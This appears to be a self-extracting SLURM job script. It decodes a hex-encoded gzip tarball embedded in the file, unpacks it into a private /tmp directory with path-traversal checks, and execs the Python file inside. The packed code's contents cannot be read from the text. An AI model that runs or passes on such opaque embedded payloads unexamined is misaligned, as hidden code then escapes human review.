#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95416fdb2014c77bf6a740b9d8962282ed809d5439eebec3b6cb5455d83c12d2c45840d666d3befbc08eaa4c95766bbb69fc0ec6d8bcff83f77840f0deeafee655211e46c8d892972da9aae5f3fbf49dd5acbe41e475a73571b28e1beff22d7cfd85fc9839fd00fd6c8d66bc2545592d29ab9bd56c8e66033f1f3417f776c74bcac611c024adab95a08c760daf644565b5945452261b1055493bb15c41538b8e08d22e0523755952209d941c6a71adda9e1d582f4aaba6a094843f07de5f396b5750d3b2a202a06e1a41392bdb55cb41025bad0a46a884b6664cb0a6686a59c88e49104dc55be197c08a72f6f3bd63fb2f40f0707e751f7faeffa2285ed4ff7259c5fa7f0bd471d0c6217bb6f37011cc77dcee0eaa9dfba0487580441a7d440377e123ba0cfee8bb89d98426f386989bedb7afc55d7edb6d82060ef56db3cc2c5232de2e698e0df89277f0e4b23c4ff8649a2e06a3f7d0b945a78fc753afdc79b1df9fe1d46fd37cd17d4dc79329bd0b326efb3d4db8b5e0dd5fa688a7a322e393f8789e7875bc8327a1b660bdabcdc6abfc7e8ca577c9a3723b74591fd603f419cf11b7c8ad1324b54180543f769092a8d70e01eef91170d828ce06eb2cd5a6db7123ee770559a4f9bad3bd53fd09ae6d940d0eb21c79c914e334a88eeb9ee4723c04b9b5e1ca02fac20f27f8608c3659fab9b75c86490c2797e65e72d8f8500ee96232bc1d8225f40e1f1f8432d9d4b19b4fe604737852d6ddeb87b197fba18f4639b804c7619f00c33b374e0ca6ac84848424861c63d5870867646e9dc946a7feefb805ae168cf7fa792b1cb9ea93f0c84c9ebcf75e8e44229148241289442291482412894422914824128944229148e47fe517da8e948000280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
